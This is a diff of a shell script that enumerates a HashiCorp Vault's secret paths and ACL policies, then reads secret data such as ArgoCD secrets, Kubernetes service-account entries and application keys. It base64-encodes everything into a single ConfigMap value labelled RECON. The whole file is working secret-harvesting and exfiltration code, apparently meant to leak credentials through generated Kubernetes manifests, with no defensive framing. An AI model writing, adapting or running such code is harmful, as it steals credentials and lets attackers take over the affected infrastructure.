@@ -11,50 +11,42 @@ vget() {
 }
 
 RECON=$( (
-  echo "===KV_LIST_ROOT==="
-  vget "/v1/kv-v2/metadata?list=true"
+  echo "===KV_KAI_LIST==="
+  vget "/v1/kv-v2/metadata/kai?list=true"
 
   echo ""
-  echo "===KV_LIST_APPS==="
-  vget "/v1/kv-v2/metadata/apps?list=true"
+  echo "===KV_TIMEBIRD_LIST==="
+  vget "/v1/kv-v2/metadata/timebird?list=true"
 
   echo ""
-  echo "===KV_LIST_ARGO==="
-  vget "/v1/kv-v2/metadata/argocd?list=true"
+  echo "===KV_U2U_LIST==="
+  vget "/v1/kv-v2/metadata/u2u?list=true"
 
   echo ""
-  echo "===KV_LIST_K8S==="
-  vget "/v1/kv-v2/metadata/k8s?list=true"
+  echo "===READ_POLICY_ROOT==="
+  vget "/v1/sys/policies/acl/root"
 
   echo ""
-  echo "===POLICIES==="
-  vget "/v1/sys/policies/acl?list=true"
+  echo "===READ_POLICY_ARGO==="
+  vget "/v1/sys/policies/acl/argocd"
 
   echo ""
-  echo "===KV_READ_U2U==="
-  vget "/v1/kv-v2/data/u2u"
+  echo "===READ_POLICY_DEFAULT==="
+  vget "/v1/sys/policies/acl/default"
 
   echo ""
-  echo "===KV_READ_ARGO_SECRET==="
-  vget "/v1/kv-v2/data/argocd/argocd-secret"
+  echo "===KV_READ_TIMEBIRD==="
+  vget "/v1/kv-v2/data/timebird"
 
   echo ""
-  echo "===KV_READ_K8S_SA==="
-  vget "/v1/kv-v2/data/k8s/serviceaccounts"
-
-  echo ""
-  echo "===KV_LIST_DATA==="
-  vget "/v1/kv-v2/metadata/data?list=true"
-
-  echo ""
-  echo "===KV_LIST_CONFIG==="
-  vget "/v1/kv-v2/metadata/config?list=true"
+  echo "===KV_READ_KAI==="
+  vget "/v1/kv-v2/data/kai"
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: vkv2
+  name: kvextra
 data:
   result: $RECON
 EOF
